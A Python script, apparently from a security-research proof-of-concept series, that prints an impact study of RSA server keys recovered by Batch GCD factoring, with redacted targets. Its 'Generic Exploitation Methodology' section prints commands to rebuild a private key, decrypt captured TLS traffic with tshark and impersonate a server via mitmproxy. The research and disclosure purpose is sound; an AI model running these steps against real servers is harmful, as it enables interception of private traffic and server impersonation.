#!/usr/bin/env python3
"""TLS Interception Analysis — Theoretical Impact of Factored RSA Keys.

Demonstrates the THEORETICAL consequences of recovering RSA private keys
via Batch GCD factoring. All target data has been redacted.

NOTE: This script performs NO network connections. It is a static analysis
and educational demonstration only.
"""
import json
import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MEGA_VULN = os.path.join(SCRIPT_DIR, "..", "poc-07-batch-gcd", "MEGA_VULNERABLE.json")


def load_redacted_keys():
    """Load redacted factored RSA key metadata."""
    with open(MEGA_VULN) as f:
        return json.load(f)


def demonstrate_key_recovery_theory(entries):
    """Show what private key recovery means in practice."""
    print("━━━ Factored Key Statistics ━━━")
    print()

    bit_dist = {}
    for entry in entries:
        bits = entry.get("bits", 0)
        bit_dist[bits] = bit_dist.get(bits, 0) + 1

    for bits, count in sorted(bit_dist.items()):
        print(f"  RSA-{bits}: {count} keys")
    print(f"  Total: {len(entries)} keys with full private key material recovered")
    print()


def demonstrate_tls_decryption_theory():
    """Explain what an attacker can do with a recovered RSA private key."""
    print("━━━ TLS Decryption Capability (Theoretical) ━━━")
    print()
    print("  With a server's RSA private key, an attacker can:")
    print()
    print("  1. PASSIVE DECRYPTION (RSA key exchange)")
    print("     - Capture TLS traffic with tcpdump/Wireshark")
    print("     - Extract pre-master secret from ClientKeyExchange")
    print("     - Decrypt the entire session retroactively")
    print("     - Affected ciphersuites: TLS_RSA_WITH_*")
    print()
    print("  2. ACTIVE MITM (any key exchange)")
    print("     - Impersonate the server with the real private key")
    print("     - Client sees the REAL certificate — no warnings")
    print("     - Even PFS ciphersuites (ECDHE) defeated by active MITM")
    print()
    print("  3. SERVER IMPERSONATION")
    print("     - Serve the real certificate signed by the real key")
    print("     - Indistinguishable from the legitimate server")
    print()
    print("  Root cause: Weak PRNG during RSA key generation")
    print("  led to shared prime factors across independent keys.")
    print("  Batch GCD exploits this in O(n*log^2(n)) time.")
    print()


def demonstrate_generic_exploitation_method():
    """Show generic exploitation methodology (no real targets)."""
    print("━━━ Generic Exploitation Methodology ━━━")
    print()
    print("  # Step 1: Reconstruct PEM private key from factored p, q")
    print("  python3 -c \"")
    print("    from Crypto.PublicKey import RSA")
    print("    key = RSA.construct((n, e, d, p, q))")
    print("    open('recovered.pem','wb').write(key.export_key())\"")
    print()
    print("  # Step 2: Decrypt captured TLS traffic (Wireshark)")
    print("  tshark -r capture.pcap \\")
    print("    -o 'tls.keys_list:<target_ip>,<port>,http,recovered.pem'")
    print()
    print("  # Step 3: MITM with mitmproxy (authorized testing only)")
    print("  mitmproxy --mode reverse:https://<target_ip>:<port> \\")
    print("    --cert recovered.pem")
    print()
    print("  WARNING: These commands are for authorized penetration testing")
    print("  and educational purposes ONLY. Unauthorized use is illegal.")
    print()


def main():
    print("=" * 65)
    print("  TLS Interception Analysis — Factored RSA Key Impact Study")
    print("=" * 65)
    print()
    print("  NOTE: All target data redacted. No network connections made.")
    print()

    if not os.path.exists(MEGA_VULN):
        print(f"Error: {MEGA_VULN} not found")
        sys.exit(1)

    entries = load_redacted_keys()
    print(f"Loaded {len(entries)} redacted factored key records")
    print()

    demonstrate_key_recovery_theory(entries)
    demonstrate_tls_decryption_theory()
    demonstrate_generic_exploitation_method()

    # Impact summary
    print("━━━ Impact Assessment ━━━")
    print()
    print(f"  {len(entries)} TLS servers' RSA private keys were recovered")
    print(f"  from PUBLIC certificate data using Batch GCD factoring.")
    print()
    print("  This is NOT a theoretical attack — real private keys")
    print("  were mathematically recovered from public certificates.")
    print("  Details redacted to prevent misuse.")
    print()


if __name__ == "__main__":
    main()
